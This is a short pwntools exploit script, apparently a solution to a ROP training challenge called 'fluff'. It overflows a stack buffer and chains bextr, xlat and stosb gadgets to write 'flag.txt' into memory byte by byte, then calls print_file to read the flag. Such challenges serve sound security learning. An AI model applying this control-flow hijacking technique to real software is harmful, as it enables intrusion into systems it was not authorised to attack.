
from pwn import *

exe = './fluff'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
b * pwnme+152
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

p = start()

bss =        p64(0x601200)
print_file = p64(0x400510)
ret =        p64(0x400295)
poprdi =     p64(0x4006a3)
xlat =       p64(0x400628)
bext =       p64(0x40062a)
stos =       p64(0x400639)

f      =     0x6003c4
l      =     0x400239
a      =     0x4003d6
g      =     0x4007a0
dot    =     0x40024e
t      =     0x400192
x      =     0x400725

x = (40*b"a" + poprdi + bss +
            bext + p64(8192) + p64(f-0x3ef2-0xb)     + xlat + stos +    #f
            bext + p64(8192) + p64(l-0x3ef2-0x66)    + xlat + stos +    #l
            bext + p64(8192) + p64(a-0x3ef2-0x6c)    + xlat + stos +    #a
            bext + p64(8192) + p64(g-0x3ef2-0x61)    + xlat + stos +    #g
            bext + p64(8192) + p64(dot-0x3ef2-0x67)  + xlat + stos +    #.
            bext + p64(8192) + p64(t-0x3ef2-0x2e)    + xlat + stos +    #t
            bext + p64(8192) + p64(x-0x3ef2-0x74)    + xlat + stos +    #x
            bext + p64(8192) + p64(t-0x3ef2-0x78)    + xlat + stos +    #t
            poprdi + bss + ret + print_file)
# making flag.txt byte by byte through bytes within the binary 
p.send(x)
p.interactive()

